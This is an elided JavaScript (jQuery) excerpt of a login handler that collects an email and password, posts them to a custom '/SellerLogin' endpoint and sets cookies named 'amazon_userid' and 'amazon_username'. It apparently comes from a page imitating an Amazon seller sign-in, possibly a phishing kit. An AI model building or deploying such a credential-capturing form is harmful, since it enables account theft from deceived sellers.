$(function () {
    ...
    signInSubmit.click(function () {
        ...
        if (ap_password.val().trim().length < 6) {
        ...
        var sellerMessage = {
            account: ap_email.val().trim(),
            pwd: ap_password.val().trim(),
        ...
        $.post(baseUrl + '/SellerLogin', sellerMessage, function (data) {
            ...
            if (data.result == 1) {
                inputctr.public.setCookie('amazon_userid', data.userid);
                inputctr.public.setCookie('amazon_username', sellerMessage.account);
